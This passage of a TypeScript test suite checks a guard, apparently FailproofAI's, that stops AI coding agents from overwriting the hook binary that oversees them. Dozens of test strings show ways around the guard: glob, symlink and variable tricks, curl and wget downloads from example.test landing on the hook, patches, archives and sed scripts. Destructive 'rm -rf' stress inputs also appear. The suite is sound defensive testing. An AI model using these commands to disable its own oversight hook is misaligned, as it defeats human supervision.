        Array.from({ length: 1000 }, (_, i) => `ln -s /tmp/t${i} /tmp/l${i}; printf x > /tmp/l${i}/f`).join("; "),
      ],
      ["a 2,000-segment glob", "rm -rf " + Array(2000).fill("*").join("/")],
      // A value that refers to itself grew with every expansion pass.
      ["a self-referring variable", "A=" + "$A".repeat(100) + "; echo $A"],
      // The envelope's 128 KB field cap. A lookbehind that scanned back over a
      // run of letters at every position took 16 s at 32 KB, and a long path
      // walked on disk one component at a time took a second at 128 KB.
      ["a 128 KB word of letters after a command", "find . -name '*.sqlite' -delete " + "x".repeat(128_000)],
      ["a 128 KB run of option letters", "echo -" + "a".repeat(128_000)],
      ["thirty long option clusters, each glued to .bin", "echo " + Array(30).fill("-" + "a".repeat(4_000) + ".bin/x").join(" ")],
      ["a 128 KB run of letters ending in .bin", "echo -" + "a".repeat(128_000) + ".bin/failproofai.txt"],
      ["a 128 KB path of one-letter directories", "echo " + "a/".repeat(64_000)],
      [
        "thirty paths just under PATH_MAX",
        "echo " + Array.from({ length: 30 }, (_, i) => `w${i}/` + "a/".repeat(2_040)).join(" "),
      ],
    ])("judges %s in bounded time", async (_label, command) => {
      const started = performance.now();
      await bash(command);
      expect(performance.now() - started).toBeLessThan(3000);
    });

    // From a directory on disk, where a glued value may be a link: one per
    // letter of a long line's option words was a second of path walks.
    it.each([
      ["128 KB of distinct option clusters, each with a value glued on", "foo " + optionClusters(3_700)],
      ["curl with 128 KB of glued output files", "curl " + optionClusters(3_700).replaceAll(" -", " -so")],
      ["a chain of 2,000 links made on the line", Array.from({ length: 2000 }, (_, i) => `ln -s l${i} l${i + 1}`).join("; ") + "; printf x > l2000/x"],
      ["1,000 links put into a directory, each written through", Array.from({ length: 1000 }, (_, i) => `ln -s /tmp/t${i} out/; printf x > out/t${i}`).join("; ")],
      ["128 KB of echo with quoted redirects", Array.from({ length: 6_000 }, (_, i) => `echo 'a > b${i}'`).join("; ")],
    ])("judges %s from a directory on disk in bounded time", async (_label, command) => {
      const started = performance.now();
      await bashIn(tmpdir(), command);
      expect(performance.now() - started).toBeLessThan(3000);
    });

    it("judges a patch naming 7,000 files in bounded time", async () => {
      const files = Array.from({ length: 7_000 }, (_, i) => `*** Add File: src/f${i}.ts\n+x`);
      const started = performance.now();
      expect(await patch({ command: v4a(...files) }, tmpdir())).toBe("allow");
      expect(performance.now() - started).toBeLessThan(3000);
    });
  });

  // The guard protects the entry by NAME, so it has to be the name every
  // project-scope hook hands npx. If an integration ever installs a different
  // package or bin name, this fails instead of the guard silently protecting a
  // file no hook runs.
  it("protects the name every project-scope npx hook command runs", async () => {
    const names = new Set<string>();
    const viaNpx: string[] = [];
    const otherwise: string[] = [];
    const mixed: string[] = [];
    for (const integration of listIntegrations()) {
      if (!integration.scopes.includes("project")) continue;
      // Every event's entry, not just one: an event launched some other way
      // would be a hook the guard was never checked against.
      const launched = integration.eventTypes.map((eventType) => {
        const entry = JSON.stringify(integration.buildHookEntry("/opt/fp/bin/failproofai", eventType, "project"));
        const found = [...entry.matchAll(/npx -y (\S+)/g)].map(([, name]) => name);
        for (const name of found) names.add(name);
        return found.length > 0;
      });
      if (launched.every(Boolean)) viaNpx.push(integration.id);
      else if (launched.some(Boolean)) mixed.push(integration.id);
      else otherwise.push(integration.id);
    }
    expect(mixed).toEqual([]);
    // A new integration, or a new launcher (`npx --yes`, `bunx`), lands in one
    // of these lists and fails here until the guard is checked against it.
    expect(viaNpx.sort()).toEqual(["antigravity", "claude", "codex", "copilot", "cursor", "devin", "factory", "goose"]);
    // OpenCode runs npx from the shim checked below; Pi loads the extension by
    // a package path, which runs the CLI next to it, not through npx.
    expect(otherwise.sort()).toEqual(["opencode", "pi"]);
    // OpenCode's entry is a plugin path; the npx call is inside the shim that
    // install writes next to it.
    const dir = mkdtempSync(join(tmpdir(), "fpai-npx-guard-opencode-"));
    const cwd = vi.spyOn(process, "cwd").mockReturnValue(dir);
    try {
      listIntegrations()
        .find((integration) => integration.id === "opencode")!
        .writeHookEntries({}, "/opt/fp/bin/failproofai", "project");
      const shim = readFileSync(join(dir, ".opencode", "plugins", "failproofai.mjs"), "utf8");
      // The launcher and its arguments, tied to the same switch, so a shim that
      // kept these arguments for another program would fail here.
      expect(shim).toContain("const USE_NPX = true;");
      expect(shim).toMatch(/const cmd = USE_NPX \? "npx" :/);
      const spawned = [...shim.matchAll(/USE_NPX\s*\?\s*\["-y", "([^"]+)"/g)].map(([, name]) => name);
      expect(spawned.length).toBeGreaterThan(0);
      for (const name of spawned) names.add(name);
    } finally {
      cwd.mockRestore();
      rmSync(dir, { recursive: true, force: true });
    }
    expect([...names]).toEqual(["failproofai"]);
    for (const name of names) {
      expect((await write(`/work/proj/node_modules/.bin/${name}`)).decision).toBe("deny");
      expect(await bash(`cp /tmp/stub.sh node_modules/.bin/${name}`)).toBe("deny");
    }
  });
});

/**
 * hermes's seventh review of FailproofAI/failproofai#1058, each reproduced with
 * real bash, curl and wget in a scratch project first: a final-component glob
 * over more names than the walk expanded (F7), variable values that reach a
 * destination through another variable, an operator, or a `cd` (F11), and a
 * long option cut short (`--output-di`), which curl before 8 and every
 * getopt_long tool take. Alongside, the same paths through a sweep of npm's
 * bin directory, a link made earlier on the line, a loop, the builtins that set
 * a variable without `=`, and a sed script read from a file.
 */
describe("block-failproofai-commands — hermes's seventh round", () => {
  let root: string;
  let proj: string;

  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), "fpai-npx-round7-"));
    proj = join(root, "proj");
    mkdirSync(join(proj, "node_modules", ".bin"), { recursive: true });
    mkdirSync(join(proj, "out"));
    mkdirSync(join(proj, "many"));
    writeFileSync(join(proj, "node_modules", ".bin", "failproofai"), "#!/bin/sh\n");
    symlinkSync(join(proj, "node_modules", ".bin"), join(proj, "bins"));
    symlinkSync(join(proj, "node_modules", ".bin", "failproofai"), join(proj, "hook"));
    // More plain names than a glob was expanded to, and one link among them.
    for (let i = 0; i < 4200; i++) writeFileSync(join(proj, "many", `a${String(i).padStart(4, "0")}`), "");
    symlinkSync(join(proj, "node_modules", ".bin", "failproofai"), join(proj, "many", "hook"));
    writeFileSync(join(proj, "writes.sed"), "w hook\n");
    writeFileSync(join(proj, "prints.sed"), "p\n");
    writeFileSync(join(proj, "out", "a.txt"), "");
    const diff = (path: string) => `--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n-#!/bin/sh\n+exit 0\n`;
    writeFileSync(join(proj, "entry.patch"), diff("node_modules/.bin/failproofai"));
    writeFileSync(join(proj, "links.patch"), diff("bins/failproofai"));
    writeFileSync(join(proj, "app.patch"), diff("src/app.ts"));
    writeFileSync(join(proj, "output.cfg"), "silent\noutput = hook\n");
    writeFileSync(join(proj, "landing.cfg"), "output-dir = bins\nremote-name\n");
    writeFileSync(join(proj, "quiet.cfg"), "# just quiet\nsilent\n");
  });

  afterAll(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it.each([
    // F7: past 4096 plain names, the link among them still counts.
    "tee many/* < /tmp/stub.sh",
    "cat /tmp/stub.sh | tee many/?*",
    "cd many && tee * < /tmp/stub.sh",
    "for f in many/*; do cat /tmp/stub.sh > \"$f\"; done",
    // A write that sweeps npm's bin directory writes the entry in it.
    "tee bins/* < /tmp/stub.sh",
    "tee node_modules/.bin/* < /tmp/stub.sh",
    "cp /tmp/stub.sh node_modules/.bin/*",
    // A glob reads the links this line made before it.
    "ln -s ../node_modules/.bin out/b && cp /tmp/stub.sh out/b*/failproofai",
    "ln -s ../node_modules/.bin out/b && cd out/b* && printf x > failproofai",
  ])("denies a glob that writes the entry: %s", async (command) => {
    expect(await bashIn(proj, command)).toBe("deny");
  });

  it.each([
    // F11: a value through another variable, read when it is assigned.
    "A=bins; (A=out); B=$A; cp /tmp/stub.sh $B/failproofai",
    "A=bins; A=out true; B=$A; cp /tmp/stub.sh $B/failproofai",
    "A=bins; (A=out); B=${A}; cp /tmp/stub.sh ${B}/failproofai",
    "N=fail; M=${N}proofai; (N=x); printf x > bins/$M",
    // A `cd` to each value the operand may hold.
    "D=bins; (D=out); cd $D && printf x > failproofai",
    "D=bins; D=out true; cd \"${D}\" && printf x > failproofai",
    "D=bins; (D=out); pushd $D > /dev/null && printf x > failproofai",
    "export D=bins; (D=out); cd $D; printf x > failproofai",
    // Operators as bash applies them.
    "D=bins; cd ${D%/} && printf x > failproofai",
    "D=out; cp /tmp/stub.sh ${D/out/bins}/failproofai",
    "cp /tmp/stub.sh ${X:-bins}/failproofai",
    "N=D; D=bins; cp /tmp/stub.sh ${!N}/failproofai",
    // Values set without `=`, and ones the walk cannot read.
    "D=bins; declare -n R=D; cp /tmp/stub.sh $R/failproofai",
    "read D <<< bins; cp /tmp/stub.sh $D/failproofai",
    "printf -v D bins; cp /tmp/stub.sh $D/failproofai",
    "for d in out bins; do cp /tmp/stub.sh $d/failproofai; done",
    "for n in x failproofai; do printf x > bins/$n; done",
    "D=$(echo bins); cp /tmp/stub.sh $D/failproofai",
    "D=`echo bins`; cp /tmp/stub.sh $D/failproofai",
  ])("denies a variable that carries the write onto the entry: %s", async (command) => {
    expect(await bashIn(proj, command)).toBe("deny");
  });

  it.each([
    // A long option cut short, as curl before 8 and getopt_long take it.
    "curl -s --output-di bins -O https://example.test/failproofai",
    "curl -s --output-d node_modules/.bin --remote-name https://example.test/failproofai",
    "curl -s --output-dir bins --remote-name-a https://example.test/failproofai",
    "curl -s --output-dir out -O https://example.test/x --nex --output-di bins -O https://example.test/failproofai",
    "wget -q --directory-p=bins https://example.test/failproofai",
    "wget -q --dir bins https://example.test/failproofai",
    // The names wget gives that are not the URL's last segment.
    "cd bins && wget -q --default-page=failproofai https://example.test/",
    "wget -q -P bins --default-p=failproofai https://example.test/",
    "wget -q -e dir_prefix=bins https://example.test/failproofai",
    "cd bins && wget -q --trust-server-names https://example.test/x",
    // The other files curl writes.
    "curl -s --stderr hook -o /dev/null https://example.test/x",
    "curl -s --stde hook -o /dev/null https://example.test/x",
    "curl -s -c hook https://example.test/x",
    "curl -s --cookie-j hook https://example.test/x",
  ])("denies a download option that lands on the entry: %s", async (command) => {
    expect(await bashIn(proj, command)).toBe("deny");
  });

  it.each([
    "sed -n -f writes.sed /tmp/notes",
    "sed -n --file=writes.sed /tmp/notes",
    "sed -nf writes.sed /tmp/notes",
    "sed -n -f missing.sed /tmp/notes",
  ])("denies a sed script file that writes the entry, or one it cannot read: %s", async (command) => {
    expect(await bashIn(proj, command)).toBe("deny");
  });

  it.each([
    // An archive extracted into npm's bin directory.
    "tar -xf /tmp/stub.tar -C bins",
    "tar --extract --file=/tmp/stub.tar --directory=node_modules/.bin",
    "cd bins && tar -xzf /tmp/stub.tgz",
    "unzip -o /tmp/stub.zip -d bins",
    // A patch file that names the entry, directly or through a link.
    "patch -p1 < entry.patch",
    "patch -p1 -i links.patch",
    "git apply entry.patch",
    "git -C . apply links.patch",
    "cat entry.patch | patch -p1",
    "patch -p1 < missing.patch",
    // A curl config read onto the line.
    "curl -K output.cfg https://example.test/x",
    "curl --config landing.cfg https://example.test/failproofai",
    "curl -sK missing.cfg https://example.test/x",
  ])("denies an archive, patch or config that writes the entry: %s", async (command) => {
    expect(await bashIn(proj, command)).toBe("deny");
  });

  it.each([
    "rm -rf node_modules/.bin/*",
    "tar -xf /tmp/stub.tar -C out",
    "tar -czf out/backup.tgz node_modules",
    "patch -p1 < app.patch",
    "git apply app.patch",
    "curl -K quiet.cfg https://example.test/x -o out/x",
    "ls many/* > /dev/null",
    "wc -l many/* > out/counts",
    "for f in out/*.txt; do cp \"$f\" \"$f.bak\"; done",
    "for f in many/a000*; do cat \"$f\" > /dev/null; done",
    "D=out; cp /tmp/stub.sh ${D}/notes",
    "D=out/; cp /tmp/stub.sh ${D%/}/x",
    "OUT=out/log.txt; echo hi > \"$OUT\"",
    "cp /tmp/stub.sh ${X:-out}/notes",
    "read D <<< out; cp /tmp/stub.sh $D/notes",
    "cd out && curl -sO https://example.test/failproofai/my-tool",
    "curl -s --cookie hook https://example.test/x",
    "sed -n -f prints.sed /tmp/notes > out/x",
    "cd out && wget -q --default-page=index.txt https://example.test/",
  ])("still allows: %s", async (command) => {
    expect(await bashIn(proj, command)).toBe("allow");
  });

  // F13: curl's `-O` takes no value, so the URL after it is no file name, and
  // a download from a directory Codex does not report lands by the URL's last
  // segment, `my-tool` here.
  it.each([
    "cd out && curl -sO http://host/failproofai/my-tool",
    "cd out && curl -s -O http://host/failproofai/my-tool",
    "cd out && curl -sSLO http://host/failproofai/my-tool",
  ])("allows a Codex download whose URL only passes through a failproofai directory: %s", async (command) => {
    expect(await bashAs("codex", { command })).toBe("allow");
  });

  it.each([
    "curl -sD failproofai http://host/x",
    "curl -s --stderr failproofai http://host/x",
    "curl -so failproofai http://host/x",
  ])("denies a Codex download that names the entry as a file curl writes: %s", async (command) => {
    expect(await bashAs("codex", { command })).toBe("deny");
  });
});

// Found end to end on macOS, whose default shell is zsh: Claude Code runs the
// agent's command there, `**/` recurses with no option, and `setopt globdots`
// lets `*` match `.bin`.
describe("block-failproofai-commands — globs read the way zsh expands them", () => {
  let root: string;
  let proj: string;

  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), "fpai-zsh-glob-"));
    proj = join(root, "proj");
    mkdirSync(join(proj, "node_modules", ".bin"), { recursive: true });
    mkdirSync(join(proj, "deep", "a", "b"), { recursive: true });
    mkdirSync(join(proj, "src", "lib"), { recursive: true });
    symlinkSync(join(proj, "node_modules", ".bin", "failproofai"), join(proj, "deep", "a", "b", "hook"));
  });

  afterAll(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it.each([
    "cp /tmp/stub.sh deep/**/hook",
    "cp /tmp/stub.sh deep/***/hook",
    "setopt globdots; cp /tmp/stub.sh node_modules/*/failproofai",
    "setopt GLOB_DOTS; cp /tmp/stub.sh node_modules/*/failproofai",
    "setopt extendedglob; cp /tmp/stub.sh deep/a/b/(#i)HOOK",
  ])("denies %s", async (command) => {
    expect(await bashIn(proj, command)).toBe("deny");
  });

  it("still allows a recursive cleanup in a tree with more directories than one glob component reads", async () => {
    for (let i = 0; i < 1100; i++) mkdirSync(join(proj, "src", "many", `d${i}`), { recursive: true });
    expect(await bashIn(proj, "rm -rf **/*.log")).toBe("allow");
  });

  it.each(["rm -f src/**/*.orig", "rm -rf **/__pycache__", "cp /tmp/stub.sh node_modules/*/notes"])(
    "still allows %s",
    async (command) => {
      expect(await bashIn(proj, command)).toBe("allow");
    },
  );
});
